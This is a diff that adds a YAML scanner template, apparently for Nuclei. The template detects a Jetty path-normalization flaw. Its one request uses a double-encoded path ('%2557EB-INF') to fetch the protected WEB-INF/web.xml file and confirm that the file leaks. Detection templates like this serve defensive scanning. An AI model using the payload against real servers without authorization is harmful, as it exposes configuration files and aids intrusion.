@@ -1,0 +1,16 @@
+id: custom-jetty-server-path-normalization-detect
+
+info:
+        name: custom-jetty-server-path-normalization-detect
+        author: 0xParthJ
+        severity: low
+        tags: panel
+
+requests:
+         - method: GET
+           path:
+                   - "{{BaseURL}}/faces/%2557EB-INF/web.xml"
+           matchers:
+                   - type: word
+                     words:
+                             - "<welcome-file>index.html</welcome-file>"
